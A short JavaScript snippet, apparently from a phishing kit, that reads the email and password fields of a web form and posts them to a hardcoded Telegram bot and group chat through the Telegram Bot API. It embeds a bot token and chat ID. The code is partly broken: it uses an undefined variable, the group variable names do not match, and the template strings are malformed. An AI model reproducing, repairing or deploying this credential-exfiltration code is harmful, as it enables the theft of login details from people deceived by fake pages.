
//Nama%20%3A%0ASSSSS%0AEmail%20%3A%0ASSSSS%0APassword%20%3A

function kirimPesan() {

    var email = document.getElementById('email')
    var password = document.getElementById('password')

    var gabungan = '%0AEmail%20%3A%0A' + nama.value + '%0APassword%20%3A'

    var token = '6873755518:AAEVB_pVOFn7CvanhZvT9eL76kIz7E4O1zs';
    var ggroup = '-4126447376'

    $.ajax({
        url: 'https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html',
        method: 'POST',
    })
}